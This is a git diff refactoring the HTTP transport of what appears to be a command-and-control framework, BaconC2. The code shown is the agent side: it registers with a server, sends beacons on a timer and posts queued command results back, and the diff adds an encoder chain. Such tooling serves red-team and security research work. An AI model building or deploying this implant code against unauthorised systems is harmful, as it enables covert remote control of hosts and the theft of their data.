@@ -10,12 +10,15 @@ import (
 	"time"
 
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/encoders"
 
 	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
 )
 
-var ProtocolName = "http"
+const (
+	ProtocolName = "http"
+)
 
 const (
 	registerAPIPath = "%s/api/agents/register"
@@ -23,7 +26,7 @@ const (
 	resultsAPIPath  = "%s/api/agents/results?id=%s"
 )
 
-type HTTPTransport struct {
+type HTTPClientTransport struct {
 	serverURL      string
 	agentID        string
 	httpClient     *http.Client
@@ -31,10 +34,11 @@ type HTTPTransport struct {
 	resultQueue    queue.IResultQueue
 	beaconInterval time.Duration
 	stopChan       chan struct{}
+	encoderChain   encoders.IChainEncoder
 }
 
-func NewHTTPTransport(serverURL, agentID string, commandQueue queue.ICommandQueue, resultQueue queue.IResultQueue) local_models.ITransportProtocol {
-	return &HTTPTransport{
+func NewHTTPClientTransport(serverURL, agentID string, commandQueue queue.ICommandQueue, resultQueue queue.IResultQueue, encoderChain encoders.IChainEncoder) local_models.ITransportProtocol {
+	return &HTTPClientTransport{
 		serverURL:      serverURL,
 		agentID:        agentID,
 		httpClient:     &http.Client{Timeout: 10 * time.Second},
@@ -42,10 +46,11 @@ func NewHTTPTransport(serverURL, agentID string, commandQueue queue.ICommandQueu
 		resultQueue:    resultQueue,
 		beaconInterval: 10 * time.Second,
 		stopChan:       make(chan struct{}),
+		encoderChain:   encoderChain,
 	}
 }
 
-func (t *HTTPTransport) Initialize(agent models.Agent) error {
+func (t *HTTPClientTransport) Initialize(agent models.Agent) error {
 	jsonData, err := json.Marshal(agent)
 	if err != nil {
 		return fmt.Errorf("failed to marshal agent: %w", err)
@@ -65,12 +70,12 @@ func (t *HTTPTransport) Initialize(agent models.Agent) error {
 	return nil
 }
 
-func (t *HTTPTransport) RunProtocol() error {
+func (t *HTTPClientTransport) RunProtocol() error {
 	t.beaconLoop()
 	return nil
 }
 
-func (t *HTTPTransport) sendBeacon() error {
+func (t *HTTPClientTransport) sendBeacon() error {
 
 	url := fmt.Sprintf(beaconAPIPath, t.serverURL, t.agentID)
 	resp, err := t.httpClient.Post(url, "application/json", nil)
@@ -104,7 +109,7 @@ func (t *HTTPTransport) sendBeacon() error {
 	return nil
 }
 
-func (t *HTTPTransport) SendResults() error {
+func (t *HTTPClientTransport) SendResults() error {
 	results, err := t.resultQueue.List()
 	if err != nil {
 		return fmt.Errorf("failed to get results from queue: %w", err)
@@ -141,7 +146,7 @@ func (t *HTTPTransport) SendResults() error {
 	return nil
 }
 
-func (t *HTTPTransport) beaconLoop() {
+func (t *HTTPClientTransport) beaconLoop() {
 	ticker := time.NewTicker(t.beaconInterval)
 	defer ticker.Stop()
 
@@ -157,12 +162,12 @@ func (t *HTTPTransport) beaconLoop() {
 	}
 }
 
-func (t *HTTPTransport) Close() error {
+func (t *HTTPClientTransport) Close() error {
 	t.httpClient.CloseIdleConnections()
 	close(t.stopChan)
 	return nil
 }
 
-func (t *HTTPTransport) GetBeaconInterval() time.Duration {
+func (t *HTTPClientTransport) GetBeaconInterval() time.Duration {
 	return t.beaconInterval
 }
